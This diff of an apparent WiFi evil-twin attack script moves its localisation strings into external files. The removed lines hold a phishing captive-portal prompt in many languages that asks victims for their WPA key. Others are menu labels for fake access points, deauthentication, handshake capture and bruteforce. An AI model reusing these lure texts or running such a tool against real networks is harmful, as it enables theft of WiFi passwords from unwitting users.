@@ -36,7 +36,7 @@ HANDSHAKE_PATH="/root/handshakes"
 PASSLOG_PATH="/root/pwlog"
 WORK_DIR=`pwd`
 DEAUTHTIME="9999999999999"
-revision=126
+revision=127
 version=0.25
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -240,296 +240,79 @@ function exitmode {
     
 }
 
-
 #Languages for the web interface
 
 #EN
-DIALOG_WEB_INFO_ENG="For security reasons, enter the WPA key to access the Internet."
-DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
-DIALOG_WEB_SUBMIT_ENG="Submit"
-DIALOG_WEB_ERROR_ENG="Error: The entered password is not correct!"
-DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
-DIALOG_WEB_BACK_ENG="Back"
-DIALOG_WEB_ERROR_MSG_ENG="This field is required."
-DIALOG_WEB_LENGTH_MIN_ENG="The password must be more than {0} characters!"
-DIALOG_WEB_LENGTH_MAX_ENG="The password must be less than {0} characters!"
-DIALOG_WEB_DIR_ENG="ltr"
+source $WORK_DIR/sites/neutra/en
 
 #GER
-DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben Sie bitte den WPA2 Schlüssel ein."
-DIALOG_WEB_INPUT_GER="Geben Sie den WPA2 Schlüssel ein:"
-DIALOG_WEB_SUBMIT_GER="Bestätigen"
-DIALOG_WEB_ERROR_GER="Fehler: Das eingegebene Passwort ist nicht korrekt!"
-DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen Sekunden wiederhergestellt."
-DIALOG_WEB_BACK_GER="Zurück"
-DIALOG_WEB_ERROR_MSG_GER="Dieses Feld ist ein Pflichtfeld."
-DIALOG_WEB_LENGTH_MIN_GER="Das Passwort muss länger als {0} Zeichen sein"
-DIALOG_WEB_LENGTH_MAX_GER="Das Passwort darf nicht länger als {0} Zeichen sein"
-DIALOG_WEB_DIR_GER="ltr"
+source $WORK_DIR/sites/neutra/ger
 
 #ESP
-DIALOG_WEB_INFO_ESP="Por razones de seguridad, teclea tu clave WPA para acceder a internet"
-DIALOG_WEB_INPUT_ESP="Teclea tu contraseña WPA:"
-DIALOG_WEB_SUBMIT_ESP="Enviar"
-DIALOG_WEB_ERROR_ESP="Error: La contraseña introducida no es correcta"
-DIALOG_WEB_OK_ESP="Tu conexión será restaurada en unos pocos minutos"
-DIALOG_WEB_BACK_ESP="Atrás"
-DIALOG_WEB_ERROR_MSG_ESP="Este campo es obligatorio."
-DIALOG_WEB_LENGTH_MIN_ESP="La contraseña debe ser más de {0} caracteres!"
-DIALOG_WEB_LENGTH_MAX_ESP="La contraseña debe ser menos de {0} caracteres!"
-DIALOG_WEB_DIR_ESP="ltr"
+source $WORK_DIR/sites/neutra/esp
 
 #IT
-DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave WPA per accedere a Internet"
-DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
-DIALOG_WEB_SUBMIT_IT="Invia"
-DIALOG_WEB_ERROR_IT="Errore: La password non &egrave; corretta!"
-DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
-DIALOG_WEB_BACK_IT="Indietro"
-DIALOG_WEB_ERROR_MSG_IT="Campo obbligatorio."
-DIALOG_WEB_LENGTH_MIN_IT="La password deve essere superiore a {0} caratteri"
-DIALOG_WEB_LENGTH_MAX_IT="La password deve essere inferiore a {0} caratteri"
-DIALOG_WEB_DIR_IT="ltr"
+source $WORK_DIR/sites/neutra/it
 
 #FR
-DIALOG_WEB_INFO_FR="Pour des raisons de sécurité, entrez votre clé WPA"
-DIALOG_WEB_INPUT_FR="Entrez votre clé WPA:"
-DIALOG_WEB_SUBMIT_FR="Soumettre"
-DIALOG_WEB_ERROR_FR="Erreur: Le mot de passe entré est incorrect!"
-DIALOG_WEB_OK_FR="Votre connection va être restaurée dans un instant."
-DIALOG_WEB_BACK_FR="Retour"
-DIALOG_WEB_ERROR_MSG_FR="Ce champ est obligatoire."
-DIALOG_WEB_LENGTH_MIN_FR="Le mot de passe doit avoir plus de {0} caractères"
-DIALOG_WEB_LENGTH_MAX_FR="Le mot de passe doit avoir moins de {0} caractères"
-DIALOG_WEB_DIR_FR="ltr"
+source $WORK_DIR/sites/neutra/fr
 
 #POR
-DIALOG_WEB_INFO_POR="Por razões de segurança, digite a senha para acessar a Internet"
-DIALOG_WEB_INPUT_POR="Digite novamente a senha do Wifi"
-DIALOG_WEB_SUBMIT_POR="Enviar"
-DIALOG_WEB_ERROR_POR="Erro: A senha digitada está incorreta!"
-DIALOG_WEB_OK_POR="A sua conexão será restaurada em breve."
-DIALOG_WEB_BACK_POR="Voltar"
-DIALOG_WEB_ERROR_MSG_POR="Campo de preenchimento obrigatório."
-DIALOG_WEB_LENGTH_MIN_POR="A senha deve ter mais de {0} caracteres"
-DIALOG_WEB_LENGTH_MAX_POR="A chave deve ser menor que {0} caracteres"
-DIALOG_WEB_DIR_POR="ltr"
+source $WORK_DIR/sites/neutra/porni
 
 #RUS
-DIALOG_WEB_INFO_RUS="Для получения доступа в Интернет нужно ввести WPA пароль своей точки доступа."
-DIALOG_WEB_INPUT_RUS="Введите пароль:"
-DIALOG_WEB_SUBMIT_RUS="Отправить"
-DIALOG_WEB_ERROR_RUS="Ошибка: Введенный пароль не верный!"
-DIALOG_WEB_OK_RUS="Спасибо, соединение восстановится через несколько секунд."
-DIALOG_WEB_BACK_RUS="Назад"
-DIALOG_WEB_ERROR_MSG_RUS="Это поле необходимо заполнить."
-DIALOG_WEB_LENGTH_MIN_RUS="Пароль должен быть не менее {0} символов!"
-DIALOG_WEB_LENGTH_MAX_RUS="Пароль должен быть не более {0} символов!"
-DIALOG_WEB_DIR_RUS="ltr"
+source $WORK_DIR/sites/neutra/rus
 
 #TR
-DIALOG_WEB_INFO_TR="İnternet'e erişmek icin WPA kablosuz ağ şifrenizi giriniz:"
-DIALOG_WEB_INPUT_TR="Lütfen parolanızı giriniz:"
-DIALOG_WEB_SUBMIT_TR="Giriş"
-DIALOG_WEB_ERROR_TR="Hata: girilen şifre doğru değil! "
-DIALOG_WEB_OK_TR="Bağlantı birkaç dakika içinde yapılandırılacaktır."
-DIALOG_WEB_BACK_TR="Geri"
-DIALOG_WEB_ERROR_MSG_TR="Bu alanın doldurulması zorunludur."
-DIALOG_WEB_LENGTH_MIN_TR="Parola en az {0} karakterden olmalıdır."
-DIALOG_WEB_LENGTH_MAX_TR="Parola {0} karakterden daha fazla olmamalıdır."
-DIALOG_WEB_DIR_TR="ltr"
+source $WORK_DIR/sites/neutra/tr 
 
 #RO
-DIALOG_WEB_INFO_RO="Din motive de securitate, introduceți cheia WPA pentru a avea acces la Internet"
-DIALOG_WEB_INPUT_RO="Parola WPA:"
-DIALOG_WEB_SUBMIT_RO="Trimite"
-DIALOG_WEB_ERROR_RO="Eroare: Parola introdusa nu este corecta!"
-DIALOG_WEB_OK_RO="Conexiunea la Internet va porni in cateva momente."
-DIALOG_WEB_BACK_RO="Inapoi"
-DIALOG_WEB_ERROR_MSG_RO="Acest câmp este obligatoriu."
-DIALOG_WEB_LENGTH_MIN_RO="Parola trebuie să fie mai mare de {0} de caractere!"
-DIALOG_WEB_LENGTH_MAX_RO="Parola trebuie să fie mai mică de {0} de caractere!"
-DIALOG_WEB_DIR_RO="ltr"
+source $WORK_DIR/sites/neutra/ro 
 
 #HU
-DIALOG_WEB_INFO_HU="Biztonsági okokból adja meg a WPA kulcsot az internet eléréséhez"
-DIALOG_WEB_INPUT_HU="WPA jelszó:"
-DIALOG_WEB_SUBMIT_HU="Küldés"
-DIALOG_WEB_ERROR_HU="Hiba: A megadott jelszó helytelen!"
-DIALOG_WEB_OK_HU="Az Internet kapcsolat helyreállt. "
-DIALOG_WEB_BACK_HU="Vissza"
-DIALOG_WEB_ERROR_MSG_HU="A jelszót kötelező megadni."
-DIALOG_WEB_LENGTH_MIN_HU="A jelszó nem lehet kevesebb, mint {0} karakter!"
-DIALOG_WEB_LENGTH_MAX_HU="A jelszó kevesebb mint {0} karakter kell hogy legyen!"
-DIALOG_WEB_DIR_HU="ltr"
+source $WORK_DIR/sites/neutra/hu
 
 #ARA
-DIALOG_WEB_INFO_ARA="لأسباب أمنية، أدخل كلمة المرور الخاصة بالشبكة المدونة اعلاه من تشفير WPA للحصول على اتصال الانترنت"
-DIALOG_WEB_INPUT_ARA="ادخل كلمة السر"
-DIALOG_WEB_SUBMIT_ARA="تأكيد"
-DIALOG_WEB_ERROR_ARA="خطأ: كلمة السر المدخلة غير صحيحة"
-DIALOG_WEB_OK_ARA="سوف يتم استعادة الاتصال في لحظات قليلة! شكرا لتعاونكم"
-DIALOG_WEB_BACK_ARA="العودة"
-DIALOG_WEB_ERROR_MSG_ARA="هذا الحقل إلزامي"
-DIALOG_WEB_LENGTH_MIN_ARA="يجب أن تكون كلمة المرور أكثر من {0} أحرف او ارقام"
-DIALOG_WEB_LENGTH_MAX_ARA="يجب أن تكون كلمة المرور أقل من {0} حرفا او رقم"
-DIALOG_WEB_DIR_ARA="rtl"
+source $WORK_DIR/sites/neutra/ara
 
 #CN
-DIALOG_WEB_INFO_CN="为了您的安全考量, 请输入 WPA 密码以重新连接网络"
-DIALOG_WEB_INPUT_CN="输入您的WPA密码:"
-DIALOG_WEB_SUBMIT_CN="连接"
-DIALOG_WEB_ERROR_CN="出错了: 您输入的密码 错误!"
-DIALOG_WEB_OK_CN="您的无线网络将会在短时间内恢复"
-DIALOG_WEB_BACK_ZH_CN="返回"
-DIALOG_WEB_ERROR_MSG_CN="此处不能为空"
-DIALOG_WEB_LENGTH_MIN_CN="密码最少要有{0}个字符!"
-DIALOG_WEB_LENGTH_MAX_CN="密码必须少于{0}个字符!"
-DIALOG_WEB_DIR_CN="ltr"
+source $WORK_DIR/sites/neutra/cn 
 
 #GR
-DIALOG_WEB_INFO_GR="Για λόγους ασφάλειας, εισάγετε το WPA κωδικό για να έχετε πρόσβαση στο Internet."
-DIALOG_WEB_INPUT_GR="Εισάγετε τον WPA κωδικό:"
-DIALOG_WEB_SUBMIT_GR="Εισαγωγή"
-DIALOG_WEB_ERROR_GR="Σφάλμα: Ο κωδικός ΔΕΝ είναι σωστός!"
-DIALOG_WEB_OK_GR="Η συνδεσή σας θα αποκατασταθεί σε λίγα λεπτά"
-DIALOG_WEB_BACK_GR="Πίσω"
-DIALOG_WEB_ERROR_MSG_GR="Αυτό το πεδίο είναι υποχρεωτικό."
-DIALOG_WEB_LENGTH_MIN_GR="Ο κωδικός πρέπει να είναι πάνω από {0} χαρακτήρες"
-DIALOG_WEB_LENGTH_MAX_GR="Ο κωδικός πρέπει να είναι λιγότερο από {0} χαρακτήρες"
-DIALOG_WEB_DIR_GR="ltr"
+source $WORK_DIR/sites/neutra/gr 
 
 #CZ
-DIALOG_WEB_INFO_CZ="Omlouváme se, ale došlo k problémům se zabezpečením vašeho bezdrátového routeru. Zadejte prosím znovu vaše heslo WPA/WPA2."
-DIALOG_WEB_INPUT_CZ="Vaše heslo WPA/WPA2:"
-DIALOG_WEB_SUBMIT_CZ="Odeslat"
-DIALOG_WEB_ERROR_CZ="Chyba: Zadané heslo není správné!"
-DIALOG_WEB_OK_CZ="Děkujeme, vaše připojení bude během krátké chvíle obnoveno."
-DIALOG_WEB_BACK_CZ="Zpět"
-DIALOG_WEB_ERROR_MSG_CZ="Toto pole musíte vyplnit."
-DIALOG_WEB_LENGTH_MIN_CZ="Heslo musí být delší než {0} znak(ů)!"
-DIALOG_WEB_LENGTH_MAX_CZ="Heslo musí být kratší než {0} znaků(ů)!"
-DIALOG_WEB_DIR_CZ="ltr"
+source $WORK_DIR/sites/neutra/cz
 
 #NO
-DIALOG_WEB_INFO_NO="Av sikkerhetsmessige årsaker må WPA-nøkkelen skrives inn for å få tilgang til internett"
-DIALOG_WEB_INPUT_NO="Skriv inn ditt WPA-passord:"
-DIALOG_WEB_SUBMIT_NO="Send inn"
-DIALOG_WEB_ERROR_NO="Feilmelding: Passordet du skrev inn er IKKE riktig!"
-DIALOG_WEB_OK_NO="Din tilkobling vil snart bli gjenopprettet."
-DIALOG_WEB_BACK_NO="Tilbake"
-DIALOG_WEB_ERROR_MSG_NO="Dette feltet er nødvendig."
-DIALOG_WEB_LENGTH_MIN_NO="Passordet må inneholde mer enn {0} tegn"
-DIALOG_WEB_LENGTH_MAX_NO="Passordet må inneholde ferre enn {0} tegn"
-DIALOG_WEB_DIR_NO="ltr"
+source $WORK_DIR/sites/neutra/no
 
 #BG
-DIALOG_WEB_INFO_BG="От съображения за сигурност е необходимо да въведете своята WPA парола за да получите достъп до Интернет."
-DIALOG_WEB_INPUT_BG="Въведете своята WPA парола:"
-DIALOG_WEB_SUBMIT_BG="Изпращане"
-DIALOG_WEB_ERROR_BG="Грешка: Въведената парола е неправилна!"
-DIALOG_WEB_OK_BG="Връзката ще бъде възстановена след няколко секунди."
-DIALOG_WEB_BACK_BG="Назад"
-DIALOG_WEB_ERROR_MSG_BG="Това поле е задължително!"
-DIALOG_WEB_LENGTH_MIN_BG="Паролата трябва да съдържа повече от {0} символа!"
-DIALOG_WEB_LENGTH_MAX_BG="Паролата трябва да съдържа по-малко от {0} символа!"
-DIALOG_WEB_DIR_BG="ltr"
+source $WORK_DIR/sites/neutra/bo
 
-#SRB by ghost
-DIALOG_WEB_INFO_SRB="Zbog sigurnosnih razloga, unesite WPA ključ da bi ste pristupili internetu."
-DIALOG_WEB_INPUT_SRB="Unesite vašu WPA šifru:"
-DIALOG_WEB_SUBMIT_SRB="Potvrdi"
-DIALOG_WEB_ERROR_SRB="Greška: Šifra koju ste uneli nije tačna!"
-DIALOG_WEB_OK_SRB="Vaša konekcija će biti restartovana za par sekundi."
-DIALOG_WEB_BACK_SRB="Nazad"
-DIALOG_WEB_ERROR_MSG_SRB="Ovo polje je obavezno."
-DIALOG_WEB_LENGTH_MIN_SRB="Šifra mora biti duža od {0} simbola!"
-DIALOG_WEB_LENGTH_MAX_SRB="Šifra mora biti kraća od {0} simbola!"
-DIALOG_WEB_DIR_SRB="ltr"
+#SRB 
+source $WORK_DIR/sites/neutra/srb
 
 #PL
-DIALOG_WEB_INFO_PL="Ze względów bezpieczeństwa, wprowadź klucz WPA, aby uzyskać dostęp do Internetu"
-DIALOG_WEB_INPUT_PL="Wprowadź hasło WPA:"
-DIALOG_WEB_SUBMIT_PL="Zatwierdź"
-DIALOG_WEB_ERROR_PL="Błąd: Wprowadzone hasło nie jest poprawne!"
-DIALOG_WEB_OK_PL="Połączenie z Internetem zostanie przywrócone w ciągu kilku chwil."
-DIALOG_WEB_BACK_PL="Powrót"
-DIALOG_WEB_ERROR_MSG_PL="To pole jest obowiązkowe."
-DIALOG_WEB_LENGTH_MIN_PL="Podane hasło jest za krótkie Hasło musi zawierać więcej niż {0} znaków!"
-DIALOG_WEB_LENGTH_MAX_PL="Podane hasło jest za długie. Hasło musi być mniejsza niż {0} znaków!"
-DIALOG_WEB_DIR_PL="ltr"
+source $WORK_DIR/sites/neutra/pl
 
 #ID
-DIALOG_WEB_INFO_ID="Untuk alasan keamanan, masukkan WPA KEY (password wifi) untuk mengakses Internet."
-DIALOG_WEB_INPUT_ID="Masukkan WPA KEY (password wifi) anda:"
-DIALOG_WEB_SUBMIT_ID="Masukkan"
-DIALOG_WEB_ERROR_ID="Error: Password yang anda masukkan tidak sesuai!"
-DIALOG_WEB_OK_ID="Anda akan dapat mengakses Internet dalam beberapa saat lagi."
-DIALOG_WEB_BACK_ID="Kembali"
-DIALOG_WEB_ERROR_MSG_ID="Kolom ini wajib diisi."
-DIALOG_WEB_LENGTH_MIN_ID="Password harus lebih dari {0} karakter!"
-DIALOG_WEB_LENGTH_MAX_ID="Password harus kurang dari {0} karakter!"
-DIALOG_WEB_DIR_ID="ltr"
+source $WORK_DIR/sites/neutra/id
 
 #NL
-DIALOG_WEB_INFO_NL="Voer uw WPA-wachtwoord wegens beveiligingsredenen in om weer internettoegang te krijgen."
-DIALOG_WEB_INPUT_NL="Typ Uw WPA wachtwoord:"
-DIALOG_WEB_SUBMIT_NL="Invoeren"
-DIALOG_WEB_ERROR_NL="Error: Het ingevoerde wachtwoord is niet juist!"
-DIALOG_WEB_OK_NL="Uw verbinding wordt in enkele seconden hervat."
-DIALOG_WEB_BACK_NL="Terug"
-DIALOG_WEB_ERROR_MSG_NL="Dit veld is verplicht."
-DIALOG_WEB_LENGTH_MIN_NL="Het wachtwoord moet langer zijn dan {0} karakters!"
-DIALOG_WEB_LENGTH_MAX_NL="Het wachtwoord moet korter zijn dan {0} karakters!"
-DIALOG_WEB_DIR_NL="ltr"
+source $WORK_DIR/sites/neutra/nl
 
 #DAN
-DIALOG_WEB_INFO_DAN="Af sikkerhedsmæssige årsager, skal du skrive netværksadgangskoden, for at få adgang til internettet."
-DIALOG_WEB_INPUT_DAN="Angiv netværksadgangskoden:"
-DIALOG_WEB_SUBMIT_DAN="Forsæt"
-DIALOG_WEB_ERROR_DAN="Fejl: Den indtastede netværksadgangskode er ikke korrekt!"
-DIALOG_WEB_OK_DAN="Tak, din forbindelse vil blive genoprettet inden få sekunder."
-DIALOG_WEB_BACK_DAN="Tilbage"
-DIALOG_WEB_ERROR_MSG_DAN="Dette felt er obligatorisk"
-DIALOG_WEB_LENGTH_MIN_DAN="Netværksadgangskoden skal være på mere end {0} tegn!"
-DIALOG_WEB_LENGTH_MAX_DAN="Netværksadgangskoden skal være på mindre end {0} tegn!"
-DIALOG_WEB_DIR_DAN="ltr"
+source $WORK_DIR/sites/neutra/dan
 
 #TH 
-DIALOG_WEB_INFO_TH="กรุณากรอกรหัสผ่าน WIFI เพื่อให้แน่ใจว่าท่านไม่ใช่ Robot ในการใช้งานอินเตอร์เน็ต."
-DIALOG_WEB_INPUT_TH="กรอกรหัสผ่าน WIFI ของท่าน:"
-DIALOG_WEB_SUBMIT_TH="ยืนยัน"
-DIALOG_WEB_ERROR_TH="เกิดข้อผิดพลาด: รหัสผ่านไม่ถูกต้อง"
-DIALOG_WEB_OK_TH="กรุณารอสักครู่..ระบบกำลังพาท่านไปยังเว็บไซต์ก่อนหน้า..."
-DIALOG_WEB_BACK_TH="กลับ"
-DIALOG_WEB_ERROR_MSG_TH="กรุณากรอกช่องนี้!"
-DIALOG_WEB_LENGTH_MIN_TH="รหัสผ่านควรมีมากกว่า {0} ตัวอักษร!"
-DIALOG_WEB_LENGTH_MAX_TH="รหัสผ่านควรมีอย่างน้อย {0} ตัวอักษร!"
-DIALOG_WEB_DIR_TH="ltr"
+source $WORK_DIR/sites/neutra/th
 
 #HE 
-DIALOG_WEB_INFO_HE="מטעמי אבטחה, יש להזין את סיסמת הרשת האלחוטית (WPA)עבור קבלת גישה לאינטרנט."
-DIALOG_WEB_INPUT_HE="הזן את סיסמת הWPA:"
-DIALOG_WEB_SUBMIT_HE="שלח"
-DIALOG_WEB_ERROR_HE="שגיאה: הסיסמה שגויה!"
-DIALOG_WEB_OK_HE="החיבור לאינטרנט יוחזר בעוד כמה רגעים."
-DIALOG_WEB_BACK_HE="אחורה"
-DIALOG_WEB_ERROR_MSG_HE="זהו שדה חובה."
-DIALOG_WEB_LENGTH_MIN_HE="הסיסמה חייבת להכיל יותר מ{0} תוים!"
-DIALOG_WEB_LENGTH_MAX_HE="הסיסמה חייבת להכיל פחות מ{0} תוים!"
-DIALOG_WEB_DIR_ENG="ltr"
+source $WORK_DIR/sites/neutra/he
 
 #Portuguese 
-DIALOG_WEB_INFO_PT_BR="Por razões de segurança, insira a senha WPA para acessar a internet"
-DIALOG_WEB_INPUT_PT_BR="Insira sua senha WPA:"
-DIALOG_WEB_SUBMIT_PT_BR="Enviar"
-DIALOG_WEB_ERROR_PT_BR="Erro: A senha inserida não está correta!"
-DIALOG_WEB_OK_PT_BR="Sua conexão será recuperada em breve."
-DIALOG_WEB_BACK_PT_BR="Voltar"
-DIALOG_WEB_ERROR_MSG_PT_BR="Este campo é obrigatório."
-DIALOG_WEB_LPT_BRTH_MIN_PT_BR="A senha deve ter mais de {0} caracteres!"
-DIALOG_WEB_LPT_BRTH_MAX_PT_BR="A senha deve ter menos de {0} caracteres!"
-DIALOG_WEB_DIR_PT_BR="ltr"
+source $WORK_DIR/sites/neutra/por
 
 # Design
 function top(){
@@ -935,7 +718,7 @@ case $detectedresolution in
 		  * ) resA ;;
 esac
 
-language
+language; setinterface
 }
 
 function language {
@@ -944,7 +727,7 @@ function language {
 	conditional_clear
 
 if [ "$FLUX_AUTO" =  "1" ];then 
-	german; setinterface
+	source $WORK_DIR/language/en; setinterface
 
 else 
 
@@ -969,551 +752,20 @@ else
 		read yn
 		echo ""
 		case $yn in
-			1 ) english; setinterface; break ;;
-			2 ) german; setinterface; break ;;
-			3 ) romanian; setinterface; break;;
-			4 ) turkish; setinterface; break;;
-			5 ) spanish; setinterface; break;;
-			6 ) chinese; setinterface; break;;
-			7 ) italian; setinterface; break;;
-			8 ) czech; setinterface; break;;
-			9 ) greek; setinterface; break;;
-            10 ) french; setinterface; break;;
-			skip ) english; skipme; break;;
+			1 ) source $WORK_DIR/language/en;  break;;
+			2 ) source $WORK_DIR/language/ger; break;;
+			3 ) source $WORK_DIR/language/ro;  break;;
+			4 ) source $WORK_DIR/language/tu;  break;;
+			5 ) source $WORK_DIR/language/esp; break;;
+			6 ) source $WORK_DIR/language/ch;  break;;
+			7 ) source $WORK_DIR/language/it;  break;;
+			8 ) source $WORK_DIR/language/cz   break;;
+			9 ) source $WORK_DIR/language/gr;  break;;
+            10 ) source $WORK_DIR/language/fr; break;;
 			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
 		  esac
 	done
 fi 
-
-}
-
-function german {
-	header_setinterface="Wähle deine Netzwerkkarte aus"
-	setinterface_error="Es wurden keine Netzwerkkarten gefunden, beende..."
-
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_choosescan="Wähle deinen Kanal aus"
-
-	choosescan_option_1="Alle Kanäle"
-	choosescan_option_2="Spezifische Kanal(e)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	scanchan_option_1="Einzelner Kanal"
-	scanchan_option_2="Mehrere Kanäle"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scan="WIFI Monitor"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scanchan="Scanne Netzwerke..."
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askAP="Wähle deine Angriffsmethode aus"
-	askAP_option_1="FakeAP - Hostapd ("$red"Empfohlen)"
-	askAP_option_2="FakeAP - airbase-ng (Langsame Verbindung)"
-	askAP_option_4="Bruteforce - (Handshake wird benötigt)"
-	general_back="Zurück"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askauth="Methode zum Prüfen des Handshake"
-	askauth_option_1="Handshake ("$red"Empfohlen)"
-	askauth_option_2="Wpa_supplicant (Mehrere Ausfälle)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthforce="Handshake-Überprüfung"
-	deauthforce_option_1="aircrack-ng (Ausfall möglich)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthMENU="*Erfassung des Handshake*"
-	deauthMENU_option_1="Überprüfe Handshake"
-	deauthMENU_option_2="Starte neu"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_webinterface="Wähle deine Strategie aus"
-	header_ConnectionRESET="Wähle deine Anmeldeseite aus"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	general_case_error="Unbekannte Option, wähle neu aus"
-	general_error_1="Nicht gefunden"
-	general_error_2="Datei wurde ${red}nicht$transparent gefunden"
-	general_back="Zurück"
-	general_exitmode="Aufräumen und schließen"
-	general_exitmode_1="Deaktivierung des Monitor Interface"
-	general_exitmode_2="Deaktivierung des Interface"
-	general_exitmode_3="Deaktivierung "$grey"von weiterleiten von Paketen"
-	general_exitmode_4="Säubere "$grey"iptables"
-	general_exitmode_5="Wiederherstellung von"$grey"tput"
-	general_exitmode_6="Neustarten des "$grey"Netzwerk Manager"
-	general_exitmode_7="Wiederherstellung war erfolgreich"
-	general_exitmode_8="Vielen Dank für die Nutzung von Fluxion"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	selection_1="Mit aktive Nutzer"
-	selection_2="Wähle dein Angriffsziel aus. Um neu zu scannen tippe $red r$transparent"
-
-}
-
-function french {
-    header_setinterface="Sélectionnez une interface"
-    setinterface_error="Pas de carte wifi detecté, fin..."
-
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_choosescan="Sélectionnez un canal"
-    choosescan_option_1="Tous les canaux "
-    choosescan_option_2="Canal spécifique"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    scanchan_option_1="Un seul canal"
-    scanchan_option_2="Plusieurs canaux"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_scan="WIFI Monitor"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_scanchan="Scan du reseau"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_askAP="Sélectionnez une option d'attaque"
-    askAP_option_1="FakeAP - Hostapd ("$red"Recommandé)"
-    askAP_option_2="FakeAP - airbase-ng (Connexion plus lente)"
-    askAP_option_4="Bruteforce - (Handshake requis)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_askauth="METHODE DE VÉRIFICATION DU PASSWORD"
-    askauth_option_1="Handshake ("$red"Recommandé)"
-    askauth_option_2="Wpa_supplicant (Plus d'échecs)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_deauthforce="Vérification du Handshake"
-    deauthforce_option_1="aircrack-ng (Moins de chance)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_deauthMENU="*Capture du Handshake*"
-    deauthMENU_option_1="Vérification du Handshake"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_webinterface="Sélectionnez votre option"
-    header_ConnectionRESET="Sélectionnez la page de connexion"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    general_back="Retour"
-    general_error_1="Pas trouvé"
-    general_case_error="Option inconnue. Sélectionnez à nouveau"
-    general_exitmode="Nettoyage et fermeture"
-    general_exitmode_1="Désactivation de l'interface de monitoring"
-    general_exitmode_2="Désactivation de l'interface"
-    general_exitmode_3="Désactivation de "$grey" transmission de paquets"
-    general_exitmode_4="Nettoyage "$grey"iptables"
-    general_exitmode_5="Restauration "$grey"tput"
-    general_exitmode_6="Redémarrage "$grey"Network-Manager"
-    general_exitmode_7="Nettoyage effectué avec succès!"
-    general_exitmode_8="Merci d'avoir utilisé fluxion"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    selection_1="Clients actifs"
-    selection_2="Sélectionnez une cible. Pour relancer un scan, touche $red r$transparent"
-}
-
-function english {
-	header_setinterface="Select an interface"
-	setinterface_error="There are no wireless cards, quit..."
-
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_choosescan="Select channel"
-	choosescan_option_1="All channels "
-	choosescan_option_2="Specific channel(s)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	scanchan_option_1="Single channel"
-	scanchan_option_2="Multiple channels"
